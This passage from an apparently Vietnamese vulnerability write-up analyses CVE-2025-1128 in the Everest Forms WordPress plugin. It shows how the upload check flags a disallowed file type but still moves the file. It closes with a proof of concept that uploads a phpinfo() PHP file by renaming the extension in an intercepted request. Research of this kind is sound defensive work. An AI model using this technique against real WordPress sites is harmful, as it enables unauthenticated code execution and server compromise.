$file[&amp;#39;tmp_path&amp;#39;], $file[&amp;#39;name&amp;#39;] );&#xA;    $ext             = empty( $wp_filetype[&amp;#39;ext&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;ext&amp;#39;];&#xA;    $type            = empty( $wp_filetype[&amp;#39;type&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;type&amp;#39;];&#xA;    $proper_filename = empty( $wp_filetype[&amp;#39;proper_filename&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;proper_filename&amp;#39;];&#xA;    if ( $proper_filename || ! $ext || ! $type ) {&#xA;        evf()-&amp;gt;task-&amp;gt;errors[ $form_data[&amp;#39;id&amp;#39;] ][ $field_id ] = esc_html__( &amp;#39;File type is not allowed.&amp;#39;, &amp;#39;everest-forms&amp;#39; );&#xA;        update_option( &amp;#39;evf_validation_error&amp;#39;, &amp;#39;yes&amp;#39; );&#xA;        wp_die( &amp;#39;File type is not allowed&amp;#39; );&#xA;    }&#xA;    ...&#xA;    // upload file handler&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;code-analysis&#34;&gt;&lt;span&gt;Code Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#code-analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;public function format( $field_id, $field_submit, $form_data, $meta_key ) {&#xA;    // Setup class properties to reuse everywhere.&#xA;    $this-&amp;gt;form_data  = (array) $form_data;&#xA;    $this-&amp;gt;form_id    = absint( $this-&amp;gt;form_data[&amp;#39;id&amp;#39;] );&#xA;    $this-&amp;gt;field_id   = $field_id;&#xA;    $this-&amp;gt;field_data = $this-&amp;gt;form_data[&amp;#39;form_fields&amp;#39;][ $this-&amp;gt;field_id ];&#xA;&#xA;    $field_label = ! empty( $this-&amp;gt;form_data[&amp;#39;form_fields&amp;#39;][ $this-&amp;gt;field_id ][&amp;#39;label&amp;#39;] ) ? $this-&amp;gt;form_data[&amp;#39;form_fields&amp;#39;][ $this-&amp;gt;field_id ][&amp;#39;label&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $input_name  = sprintf( &amp;#39;everest_forms_%d_%s&amp;#39;, $this-&amp;gt;form_id, $this-&amp;gt;field_id );&#xA;    // Make sure json_decode() doesn&amp;#39;t fail on newer PHP.&#xA;    try {&#xA;        $raw_files = json_decode( wp_unslash( $_POST[ $input_name ] ), true ); // phpcs:ignore WordPress.Security&#xA;    } catch ( Exception $e ) {&#xA;        evf()-&amp;gt;task-&amp;gt;form_fields[ $this-&amp;gt;field_id ] = $processed;&#xA;        return;&#xA;    }&#xA;&#xA;    // Make sure we process only submitted files with the expected structure and keys.&#xA;    $files = array_filter(&#xA;        $raw_files,&#xA;        static function ( $file ) {&#xA;            return ( is_array( $file ) || is_object( $file ) &amp;amp;&amp;amp; count( $file ) === 2 ) &amp;amp;&amp;amp; ! empty( $file[&amp;#39;file&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $file[&amp;#39;name&amp;#39;] );&#xA;        }&#xA;    );&#xA;&#xA;    if ( empty( $files ) ) {&#xA;        evf()-&amp;gt;task-&amp;gt;form_fields[ $this-&amp;gt;field_id ] = $processed;&#xA;        return;&#xA;    }&#xA;&#xA;    $data = array();&#xA;&#xA;    foreach ( $files as $file ) {&#xA;        $file = $this-&amp;gt;generate_file_info( $file );&#xA;&#xA;        $wp_filetype = wp_check_filetype_and_ext( $file[&amp;#39;tmp_path&amp;#39;], $file[&amp;#39;name&amp;#39;] );&#xA;&#xA;        $ext             = empty( $wp_filetype[&amp;#39;ext&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;ext&amp;#39;];&#xA;        $type            = empty( $wp_filetype[&amp;#39;type&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;type&amp;#39;];&#xA;        $proper_filename = empty( $wp_filetype[&amp;#39;proper_filename&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;proper_filename&amp;#39;];&#xA;&#xA;        if ( $proper_filename || ! $ext || ! $type ) {&#xA;            evf()-&amp;gt;task-&amp;gt;errors[ $form_data[&amp;#39;id&amp;#39;] ][ $field_id ] = esc_html__( &amp;#39;File type is not allowed.&amp;#39;, &amp;#39;everest-forms&amp;#39; );&#xA;            update_option( &amp;#39;evf_validation_error&amp;#39;, &amp;#39;yes&amp;#39; );&#xA;        }&#xA;&#xA;        // Allow third-party integrations.&#xA;        if ( has_filter( &amp;#39;everest_forms_integration_uploads&amp;#39; ) ) {&#xA;            $file = apply_filters( &amp;#39;everest_forms_integration_uploads&amp;#39;, $file, $this-&amp;gt;form_data );&#xA;        }&#xA;&#xA;        if ( $this-&amp;gt;is_media_integrated() ) {&#xA;            $file[&amp;#39;path&amp;#39;] = $file[&amp;#39;tmp_path&amp;#39;];&#xA;&#xA;            $file = $this-&amp;gt;generate_file_attachment( $file );&#xA;        } elseif (&#xA;                ! isset( $file[&amp;#39;external&amp;#39;] )&#xA;                &amp;amp;&amp;amp; file_exists( $file[&amp;#39;tmp_path&amp;#39;] )&#xA;            ) {&#xA;&#xA;                $this-&amp;gt;create_dir( dirname( $file[&amp;#39;path&amp;#39;] ) );&#xA;                @rename( $file[&amp;#39;tmp_path&amp;#39;] , $file[&amp;#39;path&amp;#39;] ); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged&#xA;                $this-&amp;gt;set_file_fs_permissions( $file[&amp;#39;path&amp;#39;] );&#xA;        }&#xA;&#xA;        $data[] = $this-&amp;gt;generate_file_data( $file );&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Plugin này được tạo ra nhằm mục địch tạo form template và sử dụng chúng trong post/page. Vì lỗ hổng liên quan đến việc &lt;strong&gt;upload file&lt;/strong&gt;, nên ta tạo form với field &lt;strong&gt;File Upload&lt;/strong&gt; và nhúng nó vào post&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/create_form.png&#34; title=&#34;Tạo form với field **File Upload**&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/create_form.png&#34; data-sub-html=&#34;&lt;h2&gt;Create Form&lt;/h2&gt;&lt;p&gt;Tạo form với field **File Upload**&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/create_form.png&#39; alt=&#34;Create Form&#34; height=&#34;552&#34; width=&#34;1302&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Tạo form với field **File Upload**&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Upload file file bất kì và bắt lại bằng BurpSuite (Việc upload file cũng dành cho anonymous user khi truy cập post/page được nhúng form)&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/snap_request.png&#34; title=&#34;Bắt request fileupload bằng BurpSuite&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/snap_request.png&#34; data-sub-html=&#34;&lt;h2&gt;Snap Request&lt;/h2&gt;&lt;p&gt;Bắt request fileupload bằng BurpSuite&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/snap_request.png&#39; alt=&#34;Snap Request&#34; height=&#34;793&#34; width=&#34;794&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bắt request fileupload bằng BurpSuite&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Đặt break point đến hàm &lt;code&gt;format()&lt;/code&gt; và quan sát&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/input_name.png&#34; title=&#34;$input_name trong debugger&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/input_name.png&#34; data-sub-html=&#34;&lt;h2&gt;Input Name&lt;/h2&gt;&lt;p&gt;$input_name trong debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/input_name.png&#39; alt=&#34;Input Name&#34; height=&#34;403&#34; width=&#34;1090&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;$input_name trong debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Theo kết quả debug &lt;code&gt;$input_name&lt;/code&gt; là tên trường ánh xạ đến mảng chứa JSON data &lt;code&gt;file&lt;/code&gt; và &lt;code&gt;name&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Dữ liệu này được decode JSON và gán cho mảng &lt;code&gt;$raw_files&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;try {&#xA;    $raw_files = json_decode( wp_unslash( $_POST[ $input_name ] ), true ); // phpcs:ignore WordPress.Security&#xA;} catch ( Exception $e ) {&#xA;    evf()-&amp;gt;task-&amp;gt;form_fields[ $this-&amp;gt;field_id ] = $processed;&#xA;    return;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/raw_files.png&#34; title=&#34;$raw_files trong debugger&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/raw_files.png&#34; data-sub-html=&#34;&lt;h2&gt;Raw Files&lt;/h2&gt;&lt;p&gt;$raw_files trong debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/raw_files.png&#39; alt=&#34;Raw Files&#34; height=&#34;372&#34; width=&#34;1224&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;$raw_files trong debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$files = array_filter(&#xA;    $raw_files,&#xA;    static function ( $file ) {&#xA;        return ( is_array( $file ) || is_object( $file ) &amp;amp;&amp;amp; count( $file ) === 2 ) &amp;amp;&amp;amp; ! empty( $file[&amp;#39;file&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $file[&amp;#39;name&amp;#39;] );&#xA;    }&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Filter này trả về dữ liệu gán vào mảng &lt;code&gt;$files&lt;/code&gt;, đảm bảo chỉ xử lý các tệp được gửi có cấu trúc và khóa mong đợi, nếu lỗi sẽ trả về rỗng.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/files.png&#34; title=&#34;$files trong debugger&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/files.png&#34; data-sub-html=&#34;&lt;h2&gt;Files&lt;/h2&gt;&lt;p&gt;$files trong debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/files.png&#39; alt=&#34;Files&#34; height=&#34;365&#34; width=&#34;657&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;$files trong debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Duyệt mảng file, plugin gọi đến hàm &lt;code&gt;generate_file_info()&lt;/code&gt; để tạo thông tin tạm cho mỗi file, sau đó mới kiểm tra loại file bằng &lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;foreach ( $files as $file ) {&#xA;    $file = $this-&amp;gt;generate_file_info( $file );&#xA;    $wp_filetype = wp_check_filetype_and_ext( $file[&amp;#39;tmp_path&amp;#39;], $file[&amp;#39;name&amp;#39;] );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;protected function generate_file_info( $file ) {&#xA;    $dir = $this-&amp;gt;get_form_files_dir();&#xA;    $file[&amp;#39;tmp_path&amp;#39;] = trailingslashit( $this-&amp;gt;get_tmp_dir() ) . sanitize_file_name($file[&amp;#39;file&amp;#39;]);&#xA;    $file[&amp;#39;type&amp;#39;]     = &amp;#39;application/octet-stream&amp;#39;;&#xA;    if ( is_file( $file[&amp;#39;tmp_path&amp;#39;] ) ) {&#xA;        $filetype     = wp_check_filetype( $file[&amp;#39;tmp_path&amp;#39;] );&#xA;        $file[&amp;#39;type&amp;#39;] = $filetype[&amp;#39;type&amp;#39;];&#xA;    }&#xA;&#xA;    // Data for no media case.&#xA;    $file_ext              = pathinfo( $file[&amp;#39;name&amp;#39;], PATHINFO_EXTENSION );&#xA;    $file_base             = wp_basename( $file[&amp;#39;name&amp;#39;], &amp;#34;.$file_ext&amp;#34; );&#xA;    $file[&amp;#39;file_name_new&amp;#39;] = sprintf( &amp;#39;%s-%s.%s&amp;#39;, $file_base, wp_hash( $dir[&amp;#39;path&amp;#39;] . $this-&amp;gt;form_data[&amp;#39;id&amp;#39;] . $this-&amp;gt;field_id ), strtolower( $file_ext ) );&#xA;    $file[&amp;#39;file_name_new&amp;#39;] = wp_unique_filename( trailingslashit( $dir[&amp;#39;path&amp;#39;] ), sanitize_file_name( $file[&amp;#39;file_name_new&amp;#39;] ) );&#xA;    $file[&amp;#39;file_url&amp;#39;]      = trailingslashit( $dir[&amp;#39;url&amp;#39;] ) . $file[&amp;#39;file_name_new&amp;#39;];&#xA;    $file[&amp;#39;path&amp;#39;]          = trailingslashit( $dir[&amp;#39;path&amp;#39;] ) . $file[&amp;#39;file_name_new&amp;#39;];&#xA;    $file[&amp;#39;attachment_id&amp;#39;] = 0;&#xA;&#xA;    return $file;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều đáng chú ý là hàm sử dụng &lt;code&gt;wp_hash()&lt;/code&gt; để tạo &lt;code&gt;$file[&#39;file_name_new&#39;]&lt;/code&gt; sau đó concat vào &lt;code&gt;$dir[&#39;path&#39;]&lt;/code&gt; để gán giá trị cho &lt;code&gt;$file[&#39;path&#39;]&lt;/code&gt;, tức giá trị này được tạo ra kết hợp sử dụng &lt;strong&gt;salt&lt;/strong&gt; được thiết lập trong &lt;code&gt;wp-config.php&lt;/code&gt; =&amp;gt; ta chỉ biết được có &lt;strong&gt;salt&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Thông tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;code&gt;$file_ext&lt;/code&gt; được concat vào cuối &lt;code&gt;file[&#39;path&#39;]&lt;/code&gt;, ta có thể kiểm soát nó thông qua trường &lt;code&gt;name&lt;/code&gt; được truyền trong request.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;- _690888869ea291.55135482.txt&#xA;&amp;#43; _690888869ea291.55135482.php&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/file.png&#34; title=&#34;$file trong debugger&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/file.png&#34; data-sub-html=&#34;&lt;h2&gt;File&lt;/h2&gt;&lt;p&gt;$file trong debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/file.png&#39; alt=&#34;File&#34; height=&#34;709&#34; width=&#34;1862&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;$file trong debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ở đây ta chỉ cần chú ý đến 3 trường &lt;code&gt;tmp_path&lt;/code&gt;, &lt;code&gt;name&lt;/code&gt;, &lt;code&gt;path&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;tmp_path&lt;/code&gt; - &lt;code&gt;name&lt;/code&gt; được đặt làm đối số trong hàm &lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;tmp_path&lt;/code&gt; - &lt;code&gt;path&lt;/code&gt; được đặt làm đối số trong hàm &lt;code&gt;rename()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Như phân tích trước đó, logic vẫn chạy mặc dù file upload không được phép. &lt;code&gt;rename($file[&#39;tmp_path&#39;] , $file[&#39;path&#39;])&lt;/code&gt; được gọi để di chuyển file từ đường dẫn tạm sang đường dẫn chính.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;Hàm &lt;code&gt;format()&lt;/code&gt; được đăng ký làm callback cho action hook&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;everest_forms_process_format_&amp;#39; . $this-&amp;gt;type, array( $this, &amp;#39;format&amp;#39; ), 10, 4 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi type là &lt;code&gt;file-upload&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/type.png&#34; title=&#34;Type cần thiết để gọi format&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/type.png&#34; data-sub-html=&#34;&lt;h2&gt;Type&lt;/h2&gt;&lt;p&gt;Type cần thiết để gọi format&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/type.png&#39; alt=&#34;Type&#34; height=&#34;415&#34; width=&#34;1729&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Type cần thiết để gọi format&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi search với từ khóa &lt;code&gt;everest_forms_process_format_&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/action.png&#34; title=&#34;Hook everest_forms_process_format_file-upload được gọi&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/action.png&#34; data-sub-html=&#34;&lt;h2&gt;Action&lt;/h2&gt;&lt;p&gt;Hook everest_forms_process_format_file-upload được gọi&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/action.png&#39; alt=&#34;Action&#34; height=&#34;351&#34; width=&#34;1771&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Hook everest_forms_process_format_file-upload được gọi&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;Hook này sẽ được gọi trong hàm &lt;code&gt;do_task()&lt;/code&gt; thông quan &lt;code&gt;do_action()&lt;/code&gt; với &lt;code&gt;$field_type&lt;/code&gt; được truyền động&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function listen_task() {&#xA;    ...&#xA;    if ( ! empty( $_POST[&amp;#39;everest_forms&amp;#39;][&amp;#39;id&amp;#39;] ) ) { // phpcs:ignore WordPress.Security.NonceVerification&#xA;        $this-&amp;gt;do_task( evf_sanitize_entry( wp_unslash( $_POST[&amp;#39;everest_forms&amp;#39;] ) ) ); // phpcs:ignore WordPress.Security.NonceVerification, WordPress.Security.ValidatedSanitizedInput.InputNotSanitized&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;do_task()&lt;/code&gt; được gọi trong &lt;code&gt;listen_task()&lt;/code&gt; khi everest forms &lt;code&gt;id&lt;/code&gt; được truyền vào POST request&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;listen_task()&lt;/code&gt; được đăng ký làm callback cho action hook&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp&amp;#39;, array( $this, &amp;#39;listen_task&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hook này sẽ được xử lý trên mỗi request&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;User submits form (file)&amp;#34;] --&amp;gt; B[&amp;#34;Browser sends POST to page with form&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;WP hook triggered - listen_task()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;do_task() calls do_action() with field type&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;everest_forms_process_format_file-upload calls format()&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;generate_file_info() creates tmp_path, name, path&amp;#34;]&#xA;E --&amp;gt; G[&amp;#34;wp_check_filetype_and_ext(tmp_path, name)&amp;#34;]&#xA;G --&amp;gt; H{&amp;#34;File type check result&amp;#34;}&#xA;H --&amp;gt;|Valid| I[&amp;#34;rename(tmp_path → path) moves file to uploads&amp;#34;]&#xA;H --&amp;gt;|Invalid| J[&amp;#34;Set error but continue execution&amp;#34;]&#xA;J --&amp;gt; I&#xA;I --&amp;gt; K[&amp;#34;File accessible in uploads → potential executable upload&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo file &lt;code&gt;.txt&lt;/code&gt; chứa code php&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;TEXT&#xA;&amp;lt;?php phpinfo();?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Bật Burp Intercept và bắt file upload&lt;/li&gt;&#xA;&lt;li&gt;Sửa extension trong &lt;code&gt;name&lt;/code&gt; thành &lt;code&gt;.php&lt;/code&gt; và gửi request.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/fileuploaded.png&#34; title=&#34;File upload thành công&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/fileuploaded.png&#34; data-sub-html=&#34;&lt;h2&gt;File Uploaded&lt;/h2&gt;&lt;p&gt;File upload thành công&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/fileuploaded.png&#39; alt=&#34;File Uploaded&#34; height=&#34;351&#34; width=&#34;1771&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;File upload thành công&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Truy cập file đã upload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/result.png&#34; title=&#34;phpinfo() với file upload&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;phpinfo() với file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/result.png&#39; alt=&#34;Result&#34; height=&#34;1113&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;phpinfo() với file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 